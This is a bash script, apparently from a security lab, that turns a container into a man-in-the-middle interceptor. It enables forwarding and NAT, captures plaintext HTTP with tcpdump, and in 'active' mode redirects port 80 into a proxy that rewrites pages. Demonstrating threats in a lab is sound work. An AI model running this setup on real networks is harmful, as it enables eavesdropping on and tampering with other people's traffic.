#!/bin/bash
# Threat 4 (MitM) — turn mitm-interceptor into an on-path interceptor. Run INSIDE it.
#
#   interceptor_setup.sh            # passive: forward + tcpdump capture (READ / confidentiality)
#   interceptor_setup.sh active     # active : forward + REDIRECT into active_mitm.py (ALTER / integrity)
#
# The interceptor is the client's gateway (a hijacked route). It forwards client traffic
# to the target (MASQUERADE so replies return through it).
#   passive  -> captures the plaintext in transit (proves an on-path attacker can READ).
#   active   -> redirects forwarded :80 into a transparent proxy that REWRITES the HTML
#               (proves the attacker can ALTER, not just read). mitmproxy is unpackaged on
#               Debian trixie, so the proxy is pure-stdlib (active_mitm.py).
set -e
MODE=${1:-passive}
export DEBIAN_FRONTEND=noninteractive
command -v tcpdump >/dev/null || { apt-get update -qq && apt-get install -y -qq tcpdump iptables procps iproute2 python3 >/dev/null; }

EXT=eth0   # incus-default side (towards apache)
INT=eth1   # mitm-net side (from client)

# incus Debian images only auto-configure eth0; bring up the mitm-net NIC manually
ip addr show dev $INT | grep -q 10.66.0.2 || ip addr add 10.66.0.2/24 dev $INT
ip link set $INT up

sysctl -n net.ipv4.ip_forward > /tmp/mitm_ipforward.orig 2>/dev/null || echo 0 > /tmp/mitm_ipforward.orig
sysctl -w net.ipv4.ip_forward=1 >/dev/null
iptables -t nat -C POSTROUTING -o $EXT -j MASQUERADE 2>/dev/null || iptables -t nat -A POSTROUTING -o $EXT -j MASQUERADE

if [ "$MODE" = active ]; then
  command -v python3 >/dev/null || { apt-get update -qq && apt-get install -y -qq python3 >/dev/null; }
  # redirect forwarded HTTP from the client into the local tamper proxy
  iptables -t nat -C PREROUTING -i $INT -p tcp --dport 80 -j REDIRECT --to-ports 8080 2>/dev/null \
    || iptables -t nat -A PREROUTING -i $INT -p tcp --dport 80 -j REDIRECT --to-ports 8080
  pkill -f active_mitm.py 2>/dev/null || true; sleep 1
  setsid bash -c "python3 /root/04-mitm/active_mitm.py > /root/mitm-active.log 2>&1 < /dev/null" &
  sleep 2
  echo "ACTIVE: REDIRECT :80->8080 set; proxy: $(pgrep -f active_mitm.py >/dev/null && echo running || echo down)"
else
  # capture the forwarded HTTP in transit (proof of read-interception)
  pkill -f "tcpdump.*mitm-capture" 2>/dev/null || true; sleep 1
  setsid bash -c "tcpdump -i $EXT -n -A -s0 'tcp port 80' -w /root/mitm-capture.pcap > /dev/null 2>&1 < /dev/null" &
  sleep 2
  echo "PASSIVE: ip_forward=$(sysctl -n net.ipv4.ip_forward); MASQUERADE set; tcpdump: $(pgrep -f mitm-capture >/dev/null && echo capturing || echo down)"
fi
